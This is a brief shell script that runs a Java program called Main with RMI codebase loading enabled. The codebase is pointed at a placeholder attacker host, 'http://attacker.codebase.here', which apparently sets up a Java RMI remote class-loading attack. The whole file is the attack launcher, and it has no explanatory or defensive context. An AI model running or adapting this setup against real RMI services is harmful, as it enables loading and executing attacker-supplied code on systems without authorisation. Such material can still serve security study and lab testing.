#!/bin/sh

java -Djava.rmi.server.useCodebaseOnly=false \
     -Djava.rmi.server.codebase=http://attacker.codebase.here \
     -Djava.security.manager \
     -Djava.security.policy=policy.txt Main $1 $2
